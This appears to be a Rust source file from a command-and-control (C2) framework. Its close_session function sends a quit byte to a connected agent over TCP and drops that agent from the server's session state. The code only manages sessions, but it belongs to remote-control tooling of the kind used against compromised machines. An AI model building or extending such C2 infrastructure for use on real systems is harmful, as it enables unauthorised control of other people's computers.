use crate::c2_state::C2State;
use std::{io::Write, net::TcpStream};

pub fn close_session(conn: &mut TcpStream, state: &C2State, active: bool) -> Result<bool, String> {
    if active {
        conn.write_all(b"q").expect("Error sending instruct");

        // There should always be an active session here
        state.remove_agent(state.active_session().unwrap());
        state.set_mod("manager");
        return Ok(false);
    }

    Ok(true)
}
